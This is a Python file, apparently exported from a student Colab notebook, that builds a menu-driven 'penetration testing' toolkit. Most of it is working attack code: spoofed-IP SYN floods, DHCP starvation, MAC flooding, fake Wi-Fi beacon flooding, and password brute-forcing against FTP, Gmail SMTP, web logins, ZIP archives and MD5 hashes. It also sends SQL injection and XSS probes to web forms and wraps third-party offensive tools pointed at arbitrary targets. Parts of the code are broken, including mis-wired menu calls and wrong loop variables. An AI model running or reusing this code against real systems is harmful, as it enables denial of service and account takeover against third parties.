# -*- coding: utf-8 -*-
"""GP-Real Attack.ipynb

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/12lpQUj7X2R8qa4NsCCVk1Ah3LPN-pUzm
"""
import requests  # web
from bs4 import BeautifulSoup as bs  # web
from urllib.parse import urljoin  # web
from pprint import pprint  # web
import os
import socket
from ftplib import FTP  # pwd_attacks
import hashlib  # pwd_attacks
import zipfile  # pwd_attacks
import smtplib  # pwd_attacks
import sys
import random
from scapy.all import *
import scapy.all as scapy  #wifi scan
import re    # for wifi attack and others, this to make sure the input is correctly formatted
import smtplib  #for email_bomber

# yes = set(['yes', 'y', 'ye', 'Y', 'YES', 'Yes'])
# no = set(['no', 'n', 'NO', 'No', 'N'])


def menu():
    os.system('clear')
    os.system('clear')
    os.system('clear')
    print("""
        An Automation Penetration Testing tool from El Shorouk Academy Team.
    Used for legal purposes only!
    """)
    print("""
    {1}--Information Gathering
    {2}--Password Attacks
    {3}--Web Hacking
    {4}--Network and Wireless attacks 
    {5}--Exploitation Tools 
    {0}--Exit
    """)
    choice = input("choice: ")
    os.system('clear')
    if choice == "1":
        os.system('clear')
        info_gath()
    elif choice == "2":
        os.system('clear')
        pwd_attacks()
    elif choice == "3":
        os.system('clear')
        web_hack()
    elif choice == "4":
        os.system('clear')
        net_wire()
    elif choice == "5":
        os.system('clear')
        exp()
    else:
        menu()

def host2ip(host):
    ip = socket.gethostbyname(host)
    print("the IP address of the hostname is: " + ip)


def nmap(ip,scan):
    os.system("sudo apt install nmap")  # further progress
    # os.system("cd nmap && ./configure && make && make install")
    os.system('clear')
    if scan.lower() in 'port Scan':
        os.system('nmap -p- -sS -sV ' + ip)
    elif scan.lower() in 'os scan':
        os.system('nmap -A -sV ' + ip)
    elif scan.lower() in 'advanced Scan':
        os.system('nmap -A -sV ' + ip + '--script vuln')


def swp(target):
    os.system("git clone https://github.com/wpscanteam/wpscan.git")
    os.system('clear')
    os.system("sudo wpscan --url %s --enumerate u" % target)


def cms_scan(target):
    os.system("git clone https://github.com/Dionach/CMSmap.git")
    os.system("cd CMSmap && pip3 install .")
    os.system('clear')
    os.system("sudo cmsmap %s" % target)


def multi(target):
    os.system("git clone https://github.com/laramies/theHarvester.git")
    os.system('clear')
    os.system("cd theHarvester && sudo apt install python3-pip && python3.7 -m pip install -r requirements/dev.txt")
    os.system('clear')
    os.system("sudo theHarvester -d %s -l 500 -b google" % target)


def dirb(target):
    # It works by launching a dictionary based attack against a web server and analyzing the responses
    os.system('sudo apt install dirb')
    os.system('clear')
    os.system("sudo dirb %s " % target)

def web_hack():
    print("--------------------Web Attacks--------------------")
    print("  {1}-- Error-Based SQL Injection\n ")
    print("  {2}-- Cross Site Scripting\n ")
    print("  {3}-- Testing insecure web server configurations\n ")
    print("  {4}-- DoS Attack\n")
    print("  {5}-- Fuxploider (File upload vulnerability scanner and exploitation)\n")
    print("  {6}-- Press anything else to return to main menu\n")

    choice2 = input("Choice: ")
    if choice2 == "1":
        os.system('clear')
        sql_injection()
    elif choice2 == "2":
        os.system('clear')
        scan_xss()
    elif choice2 == "3":
        os.system('clear')
        test_ISC()
    elif choice2 == "4":
        os.system('clear')
        brute_web()
    elif choice2 == "5":
        os.system('clear')
        fux_scan()
    else:
        menu()


# set a session, define a browser
# set a session to store the session cookies in it when we request a url for persistence
req = requests.Session()
req.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " \
                                "Chrome/83.0.4103.106 Safari/537.36 "


# Extracting the web form (for web hacking menu)
def get_form(url):  # ( WEB HACK)
    # collect forms from the HTML content
    cont = bs(req.get(url).content, "html.parser")
    return cont.find_all("form")


# extract each form's details (for web hacking menu)
def get_form_details(form):  # (WEB HACK)
    # inputs, form method (GET, POST, DELETE, etc.) and action (target URL for form submission)
    details = {}
    # get the form action (target url)
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None

    # get the form method (POST, GET, etc..) - GET is the default -
    method = form.attrs.get("method", "get").lower()

    # get all the inputs details
    inputs = []
    for input_det in form.find_all("input"):
        # get type of input form control
        input_type = input_det.attrs.get("type", "text")
        # get name attribute
        input_name = input_det.attrs.get("name")
        # get the default value of that input tag
        input_value = input_det.attrs.get("value", "")
        # add everything to that list
        inputs.append({"type": input_type, "name": input_name, "value": input_value})

    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def check_sql(response):  # (SQL_INJECTION - WEB HACK)
    # Check if site is vulnerable or not based on the responses
    # a lot more can be added
    # Database for responses: https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/errors.xml
    errors = {
        # 1- MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        "check the manual that (corresponds to|fits) your mysql server version",
        "Unknown column",
        # 2- Microsoft SQL
        "unclosed quotation mark after the character string",
        "sqlserver jobc driver",
        "com\.jnetdirect\.jsql",
        "macromedia\.jdbc\.sqlserver",
        "zend_Db_(adapter|statement)_sqlsrv_exception",
        "com\.microsoft\.sqlserver\.jdb",
        # 3- Oracle
        "quoted string not properly terminated",
        "oracle error",
        "sql command not properly ended",
        "oracleException",
        # 4- PostgreSQL
        "valid postgresql result",
        "error: parser: parse error at or near",
    }
    for error in errors:
        if error in response.content.decode().lower():
            return True

    return False


# scan the website using some injection queries (SQL_INJECTION - WEB HACK)
def scan_sql(url):
    # test on url because the url itself might be vulnerable
    for i in "\"'":
        # add quote/double quote character to the url
        new_url = f"{url}{i}"
        print("[!] Testing", new_url)
        # make the HTTP request
        resp = req.get(new_url)
        if check_sql(resp):
            # FOUND SQL INJECTION ON THE URL
            print("*** SQL Injection vulnerability detected, ref:", new_url)
            return

    # testing on the HTML forms
    forms = get_form(url)
    # print the number of forms in the HTML page
    print(f"[+] Detected {len(forms)} forms on {url}.")
    for form in forms:
        form_details = get_form_details(form)
        for x in "\"'":
            # the data body we want to submit
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    # any input form that is hidden or has some value,
                    # just use it in the form body
                    try:
                        data[input_tag["name"]] = input_tag["value"] + i
                    except:
                        pass
                elif input_tag["type"] != "submit":
                    # all others except submit, use some junk data with special character
                    data[input_tag["name"]] = f"test{i}"
            # join the url with the action (form request URL)
            url = urljoin(url, form_details["action"])
            if form_details["method"] == "post":
                resp = req.post(url, data=data)
            elif form_details["method"] == "get":
                resp = req.get(url, params=data)
            # test whether the resulting page is vulnerable
            if check_sql(resp):
                print("*** SQL Injection vulnerability detected, Ref:", url)
                print("*** Form:")
                pprint(form_details)
                break


def sql_injection(url):
    # SQL INJECTION SANDBOX FOR TESTING: http://testphp.vulnweb.com/artists.php?artist=1
    # inject queries to the website's database
    # BLIND SQL INJECTION | TRUE OR FALSE STATEMENTS
    os.system('sudo pip install requests')
    os.system('sudo pip3 install requests bs4')
    scan_sql(url)
    # TO TEST ON DVWA we need a login code:
    # login_payload = {
    #     "username": "admin",
    #     "password": "password",
    #     "Login": "Login",
    # }
    # # change URL to the login page of your DVWA login URL
    # login_url = <change to the dvwa url>

    # -> login
    # r = s.get(login_url)
    # token = re.search("user_token'\s*value='(.*?)'", r.text).group(1)
    # login_payload['user_token'] = token
    # s.post(login_url, data=login_payload)


def send_req(form_details, url, value):
    # send a form from the form_details forms
    # form_details: list > form information
    # url: url of the site
    # value: our javascript value

    # get the full url if the url from action attribute is not provided fully
    target_url = urljoin(url, form_details["action"])
    # extract the input
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            # if input name and value are not None
            # then add them to the data of form submission
            data[input_name] = input_value
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        # GET request
        return requests.get(target_url, params=data)


def scan_xss(url):
    os.system('sudo pip install requests')
    os.system('sudo pip3 install requests bs4')
    # Test Machine: https://xss-game.appspot.com/level1/frame
    forms = get_form(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    script = "<Script>alert('hi')</scripT>"
    is_vulnerable = False
    for form in forms:
        form_details = get_form_details(form)
        content = send_req(form_details, url, script).content.decode()
        if script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            pprint(form_details)
            is_vulnerable = True
            # won't break because we want to print available vulnerable forms
    return is_vulnerable
    print(scan_xss(url))


def test_ISC(url):
    url = url.strip()
    req = requests.get(url)
    print((url, 'report:'))

    try:
        protection_xss = req.headers['X-XSS-Protection']
        if protection_xss != '1; mode = block':
            print(('X-XSS-Protection not set properly, it may be possible:', protection_xss))
    except:
        print('X-XSS-Protection not set, it may be possible')

    try:
        options_content_type = req.headers['X-Content-Type-Options']
        if options_content_type != 'nosniff':
            print(('X-Content-Type-Options not set properly:', options_content_type))
    except:
        print('X-Content-Type-Options not set')

    try:
        transport_security = req.headers['Strict-Transport-Security']
    except:
        print('HSTS header not set properly, Man in the middle attacks is possible')

    try:
        content_security = req.headers['Content-Security-Policy']
        print(('Content-Security-Policy set:', content_security))
    except:
        print('Content-Security-Policy missing')


def randomIP():  # DoS_web
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def randInt():  # DoS_web
    x = random.randint(1000, 9000)
    return x


def SYN_Flood(dstIP, dstPort, counter):  # DoS_web
    os.system("pip3 install scapy")
    total = 0
    print("Packets are sending ...")
    for x in range(0, counter):
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()

        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)


def brute_web(counter,dstIP,dstPort):  #brute_force_web
    counter = eval(counter)
    SYN_Flood(dstIP, int(eval(dstPort)), int(counter))


def fux_scan(url):
    os.system("git clone https://github.com/almandin/fuxploider.git")
    os.system('clear')
    os.system("cd fuxploider/ && cd pip3 install -r requirements.txt")
    os.system('clear')
    os.system("clear")
    os.system("cd fuxploider/ && python3 fuxploider.py --url " + url + "--not-regex " + "'\"wrong file type\"'")
def ftp_atk(target,username):
    # Set the password list for the dictionary attack
    password_list = "passs.txt"
    # input username & target url
    # TESTING SANDBOX: demo.wftpserver.com
    # USERNAME: demo && PW: demo
    # set the ftp port number
    port = 21
    setx = []
    f = open(password_list)
    setx = f.readlines()
    for password in setx:
        # remove the spaces from passwords in the password file
        password = password.strip()
        try:
            # attempt FTP logins
            ftp = FTP(target)
            ftp.login(user=username, passwd=password)
            print("Success:", str(password))
            break
        except Exception as e:
            print("Fail:", str(e), "  [X]->  ", password)


def md5_crack(pass_hash):
    # set flag = 0
    flag = 0
    # TEST HASH: 320157b0a9d971845c5b0a0796058c79

    wordlist = "hash.txt"
    try:
        pass_file = open(wordlist, "r")
    except:
        print("No File Found")
        quit()
    for word in pass_file:
        # password must be encoded to be readable (utf-8)
        enc_wrd = word.encode('utf-8')
        # hexdigest to be in hexadecimal state for numbers and such
        digest = hashlib.md5(enc_wrd.strip()).hexdigest()
        if digest == pass_hash:
            print("Password found")
            print("password is " + word)
            flag = 1
            break
    if flag == 0:
        print("password is not in the list")


def crack_password(password_list, obj):
    # set flag = 0
    idx = 0
    with open(password_list, 'rb') as file:
        for line in file:
            for word in line.split():
                try:
                    idx += 1
                    obj.extractall(pwd=word)
                    print("Password found at line", idx)
                    print("Password is", word.decode())
                    return True
                except:
                    continue
    return False


def zip_crack(zip_file):
    password_list = "passs.txt"
    # ZipFile object initialised
    obj = zipfile.ZipFile(zip_file)
    # count of number of words present in file
    count = len(list(open(password_list, "rb")))
    print("There are total", count,
          "number of passwords to test")
    if not crack_password(password_list, obj):
        print("Password not found in this file")


def gmail_crack(user,pwd):
    # send email requests
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    # use Extended SMTP
    smtpserver.ehlo()
    # send requests using TLS protocol
    smtpserver.starttls()

    if pwd == '0':
        passswfile = "passs.txt"
    else:
        passswfile = pwd
    try:
        passswfile = open(passswfile, "r")
    except FileNotFoundError as e:
        print(e)
        sys.exit(1)
    for password in passswfile:
        try:
            smtpserver.login(user, password)
            print("[+] Password Found %s" % password)
            break
        except smtplib.SMTPAuthenticationError:
            print("[!] Password Is Wrong. %s " % password)


def http_crack(url,username):
    print("NOTE: this method might not work on all login pages!\n")
    password_file = "passs.txt"
    file = open(password_file, "r")
    for password in file.readlines():
        password = password.strip("\n")
    data = {'username': username, 'password': password, "Login": 'submit'}
    send_data_url = requests.post(url, data=data)
    if "Login failed" in str(send_data_url.content):
        print("[*] Attempting password: %s" % password)
    else:
        print("[*] Password found: %s " % password)

def dhcp_strv():
    os.system("pip3 install scapy")
    os.system('clear')
    # turn of checking IP address so we don't mak make sure that the sending ip adress isn't the same as the replied IP.
    conf.checkIPaddr = False
    # Now we need to Craft a packet with the following attributes
    # Create DHCP discover with destination IP = broadcast
    # source MAC is random MAC address
    # source IP address = 0.0.0.0
    # dest IP = broadcast
    # source port = 68 (DHCP / BOOTp Client)
    # destination port = 67 (DHCP / BOOTp Server)
    # DHCP message type is "discover"
    # broadcast at the 2nd layer is ff:ff:ff:ff:ff:ff
    # we basically want to fake many clients that send broadcast to DHCP server asking for IP address
    # which will use all ip address pool on a DHCP server
    dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
                         /IP(src='0.0.0.0',dst='255.255.255.255') \
                         /UDP(sport=68,dport=67)  \
                         /BOOTP(op=1,chaddr = RandMAC()) \
                         /DHCP(options=[('message-type','discover'),('end')])
    # BOOTP option ==> asking for the subnet mask to use
    # Now we send the crafted packet into the network using Ethernet 0, and we will continue looping
    # >> see verbose as well
    sendp(dhcp_discover,iface='eth0',loop=1,verbose=1)
    # one of the solution for this attack is dhcp snooping


def fake_access(name):
    os.system('pip3 install faker scapy')
    os.system("apt-get install aircrack-ng")
    os.system("airmon-ng check kill")
    os.system("airmon-ng start wlan0")
    os.system('clear')
    # interface to use to send beacon frames, must be in monitor mode
    iface = "wlan0mon"
    # generate a random MAC address (built-in in scapy)
    sender_mac = RandMAC()
    # SSID (name of access point)
    ssid = name
    # 802.11 frame
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
    # beacon layer
    beacon = Dot11Beacon()
    # putting ssid in the frame
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    # stack all the layers and add a RadioTap
    frame = RadioTap() / dot11 / beacon / essid
    # send the frame in layer 2 every 100 milliseconds forever
    # using the `iface` interface
    sendp(frame, inter=0.1, iface=iface, loop=1)
    # We generate a random MAC address and set the name of the access point we want to create
    # then we create an 802.11 frame.
    # type=0:  indicates that it is a management frame.
    # subtype=8:  indicates that this management frame is a beacon frame.
    # addr1: refers to the destination MAC address, in other words, the receiver's MAC address. we use broadcast address
    # addr2: source MAC address, the sender's MAC address.
    # addr3: the MAC address of the access point.
    """
    Beacon frame is one of the management frames in IEEE 802.11 based WLANs.
    It contains all the information about the network.
    Beacon frames are transmitted periodically, they serve to announce the presence of a wireless LAN and to synchronize
    the members of the service set.
    """


def wifi_scan(ip_add_range_entered):
    os.system("pip3 install scapy")
    os.system('clear')
    print("---------This Script discovers all the local hosts in the network---------")
    # regular expression pattern to recognize all the IPV4 addresses
    ip_add_range_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]*$")
    # get the address range to arp
    if ip_add_range_pattern.search(ip_add_range_entered):
        print(f"{ip_add_range_entered} is a valid ip address range")
    else:
        print("wrong syntax for IP")
    # trying ARPing the ip address range supplied by the user
    # arping() creates a packet with an arp message
    # then it sends it to the broadcast mac address
    # program will return list of all results
    arp_result = scapy.arping(ip_add_range_entered)


def generate_packets():  # mac flooding
    packet_list = []
    for i in range(1, 1000):
        packet = Ether(src=RandMAC(), dst=RandMAC()) / IP(src=RandIP(), dst=RandIP())
        packet_list.append(packet)
    return packet_list


def cam_overflow(packet_list):  # mac flooding
   sendp(packet_list, iface='wlan')


def mac_flood():  # mac flooding
    packet_list = generate_packets()
    cam_overflow(packet_list)


def brutex(url,port):
    os.system("git clone https://github.com/1N3/BruteX")
    os.system("cd BruteX/ && ./install.sh")
    os.system('clear')
    os.system("brutex " + url + "" + port)
#post exploitation methods
def commix():
    os.system("git clone https://github.com/commixproject/commix.git commix")
    os.system("cd commix/ && python3 commix.py -h")
def corsy(url):
    os.system("git clone https://github.com/s0md3v/Corsy")
    os.system("cd Corsy/ && pip3 install requests")
    os.system("cd Corsy/ && python3 corsy.py -u " + url)
def fdsploit():
    os.system("git clone https://github.com/chrispetrou/FDsploit")
    os.system("cd FDsploit/ && pip install -r requirements.txt --upgrade --user")
    os.system("cd FDsploit/ && python3 fdsploit.py -h")
def sqlmap():
    os.system("apt-get -y install sqlmap")
    os.system("sqlmap -h")
def hostpanic(url):
    os.system("cd HostPanic/ && python3 main.py -u " + url + " -v")
